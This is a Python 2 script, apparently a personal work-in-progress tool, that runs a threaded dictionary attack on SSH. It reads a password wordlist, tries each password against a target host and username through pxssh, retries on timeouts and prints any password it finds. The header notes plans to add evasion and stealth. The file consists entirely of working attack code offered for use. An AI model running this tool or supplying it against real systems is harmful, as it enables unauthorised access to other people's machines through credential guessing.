# SSH_bot_threaded_dictionary.py
#
#	Des: 	This is a SSH dictionary attack utility that takes in a 
#			password file and the SSH host's username (which you should know) 
#			and attempts to gain access by brute forcing passwords with said 
#			passed in file. This program utilizes semaphores, threading, and 
#			handles some socket errors. Great reference!
#			
#	Issues: 1) s.login() not always function properly
#			2) pxssh does not appear to work as reliable as pexpect.
#				Sometimes, EOFs keep returning--even when the password 
#				is found. 
#			3) If many errors are spat back, it could indicate that 
#				new SSH keys are used, thus unverified. Need a way
#				to troubleshoot that.
#			4) Does not utilize any evasion or stealth techniques yet.
#
#	Completed: 	1) Created 'debug mode'
#				2)
#	Status: Functional - WIP
#
#	LU: 12/31/15

import argparse
from pexpect import pxssh
import time
from threading import *

## Global Constants
MAX_CONNECTIONS = 5
DEBUG_MODE = False
##

## Global Variables
Connection_Lock = BoundedSemaphore(value=MAX_CONNECTIONS)
Found = False
Fails = 0
EOF_Fails = 0
##

# --------------------------------------------------------------------------- #
def connect(host, user, password, release):
	# Grab global variables
	global Found
	global Fails
	global EOF_Fails
	global DEBUG_MODE

	# Test connection via SSH
	try:
		s = pxssh.pxssh()
		s.login(host, user, password)
		print "[+] *** Password Found: " + password
		Found = True

	# Handle thrown back errors
	except Exception, e:

		# Generic error usually recieved from pxssh.
		if 'EOF' in str(e):
			print "[-] Getting back a generic error..."
			EOF_Fails += 1

		# Timeout error
		if 'read_nonblocking' in str(e):
			if DEBUG_MODE: print "error recieved: " +str(e)
			Fails += 1
			time.sleep(5)
			connect(host, user, password, False) # We only want the original caller to release the lock. The children should not be able to release the lock.

		# Too many connections. Slow down
		elif 'synchronize with original prompt' in str(e):
			if DEBUG_MODE: print "error recieved: " +str(e)
			time.sleep(1)
			connect(host, user, password, False) # We only want the original caller to release the lock.

	finally:
		#print "[*] In \'finally\' statement: " +str(e)
		if release:
			Connection_Lock.release()

# --------------------------------------------------------------------------- #
def parseInputs():
	global DEBUG_MODE
	global EOF_Fails

	parser = argparse.ArgumentParser(description="This utility" +\
		" takes a target host IP address, a password file, and,"+\
		" a valid login and attempts a dictionary attack the SSH" +\
		" host in order to gain access.")

	parser.add_argument('-H', dest='tgtHost', type=str, \
		help="Specify target host")
	parser.add_argument('-F', dest='passwdFile', type=str, \
		help="Specify a password file to read from")
	parser.add_argument('-u', dest='user', type=str, \
		help="Specify a username to login with.")
	parser.add_argument('-D', dest='debugMode', action="store_true", \
		help="Gives debug information on terminal. Incomplete.")
	parser.add_argument('-T', dest='doThreads', action="store_true", \
		help="Enables threading. Boosts speed, but messages become garbled.")

	leOptions = parser.parse_args()

	if (leOptions.tgtHost == None) | (leOptions.passwdFile == None) | (leOptions.user == None):
		parser.print_help()
		exit(0)

	else:
		# Check for debug mode
		if leOptions.debugMode:
			DEBUG_MODE = True
			print "[*] Debug mode is ON!"

		# Open password file and iterate through passwords
		# in connect function. Uses threading
		fn = open(leOptions.passwdFile, 'r')

		for line in fn.readlines():
			if Found:
				print "[*] Exiting: Password Found!"
				exit(0)
			if Fails > 5:
				print "[!] Exiting: Too many Socket Timeouts"
				exit(0)
			if EOF_Fails > 5:
				print "[!] Exiting: Too many EOF errors"
				print "[!] Perhaps SSH is not enabled on the target host?"
				exit(0)

			password = line.strip('\r').strip('\n')
			print "[*] Testing: " + str(password)

			# Start connection to SSH. Do threaded or normal run?
			if leOptions.doThreads:
				# Acquire lock and begin new thread
				Connection_Lock.acquire()
				t = Thread(target=connect, args=(leOptions.tgtHost, leOptions.user, password, True))
				child = t.start()

			else:
				connect(leOptions.tgtHost, leOptions.user, password, False)

# --------------------------------------------------------------------------- #
def main():
	parseInputs()
	return

if __name__ == "__main__":
	main()
